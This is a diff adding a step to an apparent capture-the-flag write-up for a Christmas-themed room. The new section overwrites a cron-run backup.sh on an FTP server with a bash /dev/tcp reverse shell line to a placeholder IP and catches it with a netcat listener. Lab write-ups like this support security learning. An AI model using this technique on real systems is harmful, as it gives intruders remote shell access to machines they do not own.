@@ -18,3 +18,9 @@ Reverse Shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/b
 ### What movie did Santa have on his Christmas shopping list?
 - `get shoppinglist.txt`
 - `The Polar Express`
+
+### Netcat onto the FTP server
+- Notice the `backup.sh` automatically run every 1 minute so we add a reverse shell script to make it work. 
+- Get the sh and replace with the line `bash -i >& /dev/tcp/<your_ip>/4444 0>&1`. Put the sh files back again.
+- `nc -lvnp 4444`
+- Get the damn flag :)
